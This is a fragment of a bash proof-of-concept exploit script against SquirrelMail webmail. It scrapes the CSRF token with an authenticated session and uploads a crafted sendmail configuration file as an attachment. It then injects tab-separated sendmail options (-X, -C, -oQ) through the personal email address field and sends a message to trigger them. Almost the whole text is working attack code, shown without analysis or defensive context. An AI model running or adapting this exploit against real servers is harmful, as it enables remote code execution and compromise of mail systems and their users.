...
token="`curl -k -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/compose.php?mailbox=INBOX&startMessage=1" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
echo Da token is $token
attachid="`curl -k -H "Expect:" -s -b"SQMSESSID=$sessid; key=$keyid" -F"smtoken=$token" -F"send_to=$mail" -F"subject=attach" -F"body=test" -F"attachfile=@/tmp/smcnf-exp" -F"username=$squser" -F"attach=Add" $URL/src/compose.php | tee request | awk -F's:32' '{print $2}' | awk -F';' '{print $2}' | cut -d'&' -f1 | tr -d '\n'`"
...
case $pchoice in
	1) payload="$squser	-oQ/tmp/	-X/tmp/sqpoc" 
	   ;;

	2) payload="$squser	-oQ/tmp/	-C$sqspool/$attachid" 
	   ;;
esac
...
token="`curl -k -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/options.php?optpage=personal" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
echo token=$token
echo payload=$payload
curl -k -s -b"SQMSESSID=$sessid; key=$keyid" -d "smtoken=$token&optpage=personal&optmode=submit&submit_personal=Submit" --data-urlencode "new_email_address=$payload" "$URL/src/options.php?optpage=personal" | tee resp-final | grep -q 'Success' 2>/dev/null
if [ $? -ne 0 ]; then
...
curl -k -s -D/tmp/sheaders -b"SQMSESSID=$sessid; key=$keyid" -d"smtoken=$token" -d"startMessage=1" -d"session=0" \
